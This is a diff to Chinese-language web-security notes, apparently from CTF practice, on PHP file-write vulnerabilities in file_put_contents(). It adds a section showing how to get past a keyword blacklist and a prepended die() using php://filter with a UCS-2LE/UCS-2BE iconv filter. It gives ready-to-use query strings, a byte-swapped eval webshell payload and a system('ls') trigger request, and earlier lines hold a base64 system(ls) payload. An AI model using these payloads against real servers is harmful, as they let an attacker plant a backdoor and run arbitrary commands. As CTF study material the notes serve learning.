@@ -102,8 +102,8 @@ cmd=system("cat 36d.php");
 
 ^
 ## **php伪协议写文件**
-## **file_put_contents()场景写文件漏洞**
-1、写后门过滤绕过
+### **file_put_contents()场景写文件漏洞**
+#### **1、写后门过滤绕过**
 对于
 ```
 if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
@@ -118,7 +118,7 @@ file_put_contents("index.php", $input)
 ```
 
 ^
-2、伪协议写后门绕过
+#### **2、伪协议写后门绕过**
 如果是第一个参数可控，使用伪协议。
 ```
 $file = $_GET['file'];
@@ -145,3 +145,40 @@ content=aaPD9waHAgc3lzdGVtKGxzKTs/Pg== //加两个字符
 //<?php die('大佬别秀了');?>被base64过滤后变成phpdie，加两个字符变成4的倍数。
 ```
 访问jiuzhen.php即可。
+
+^
+#### **3、伪协议写后门绕过**
+```
+$file=$_GET['file'];
+$contents=$_POST['contents'];
+
+function filter($x){
+    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
+        die('too young too simple sometimes naive!');
+    }
+}
+
+filter($file);
+file_put_contents($file, "<?php die();?>".$contents);
+```
+绕过die()函数，$file使用base64伪协议。将die()过滤成die无效字符。
+但是这里过滤了base64，这里使用iconv.UCS-2LE.UCS-2BE编码解码。
+```
+?file=php://filter/write=convert.base64-decode/resource=jiuzhen.php
+?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=hack.php
+```
+```
+<?php
+$re = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_GET[1]);?>');
+echo $re;
+?>
+得?<hp pe@av(l_$EG[T]1;)>?
+```
+POST传入：
+```
+contents=?<hp pe@av(l_$EG[T]1;)>?
+```
+访问即可
+```
+/hack.php?1=system('ls');
+```
